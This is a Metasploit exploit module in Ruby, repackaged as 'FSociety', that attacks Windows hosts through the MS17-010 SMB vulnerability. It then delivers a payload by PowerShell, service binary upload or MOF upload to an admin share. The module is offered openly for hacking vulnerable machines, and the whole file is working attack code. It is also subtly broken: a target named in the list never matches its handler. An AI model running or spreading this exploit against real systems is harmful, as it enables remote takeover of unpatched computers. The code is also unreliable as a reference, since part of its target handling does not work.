##
# This module requires Metasploit: https://metasploit.com/download
# Current source: http://facebook.com/chetouane
# email: f17mous@gmail.com or chetouane@outlook.de
##


class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FSociety',
      'Description'    => %q{
        This module will allow you to hack all vulnerable windows versions to ms17-010 exploit , and it's more reliable than eternalblue and other modules..
      },
      'Author'         =>
        [
          'NSA',          # creator
          'Shadow Brokers',	# Leaked by
          'chetouane@outlook.de'	# ported and used by
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'WfsDelay'     => 10,
          'EXITFUNC' => 'thread'
        },
      'References'     =>
        [
          [ 'MSB', 'psexec'],  
          [ 'MSB', 'MS17-010-eternalblue' ],
          [ 'URL', 'https://github.com/f17mous/fsociety' ],
          [ 'URL', 'mailto://f17mous@gmail.com' ],
        ],
      'Payload'        =>
        {
          'Space'        => 3072,
          'DisableNops'  => true
        },
      'Platform'       => 'win',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          [ 'Automatic', { } ],
          [ 'PowerShell', { } ],
          [ 'Native upload', { } ],
          [ 'MOF upload', { } ]
        ],
      'DefaultTarget'  => 2,
      'DisclosureDate' => 'Sep 28 2018'
    ))

    register_options(
      [
        OptString.new('SHARE',     [ true, "The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share", 'ADMIN$' ])
      ])

    register_advanced_options(
      [
        OptBool.new('ALLOW_GUEST', [true, "Keep trying if only given guest access", false]),
        OptString.new('SERVICE_FILENAME', [false, "Filename to to be used on target for the service binary",nil]),
        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe']),
        OptString.new('SERVICE_STUB_ENCODER', [false, "Encoder to use around the service registering stub",nil])
      ])
  end

  def exploit
    begin
      eternal_pwn(datastore['RHOST'])
      smb_pwn()

    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e
      print_error("#{e.message}")
    rescue ::Errno::ECONNRESET,
           ::Rex::Proto::SMB::Exceptions::LoginError,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionRefused  => e
      print_error("#{e.class}: #{e.message}")
    rescue => error
      print_error(error.class.to_s)
      print_error(error.message)
      print_error(error.backtrace.join("\n"))
    ensure
      eternal_cleanup()       
    end
  end

  def smb_pwn()
    case target.name
    when 'Automatic'
      if powershell_installed?(datastore['SHARE'], datastore['PSH_PATH'])
        print_status('f17mous@gmail.com')
        execute_powershell_payload
      else
        print_status('chetouane@outlook.de')
        native_upload(datastore['SHARE'])
      end
    when 'PowerShell'
      execute_powershell_payload
    when 'chetouane methode'
      native_upload(datastore['SHARE'])
    when 'MOF upload'
      mof_upload(datastore['SHARE'])
    end

    handler
  end
end
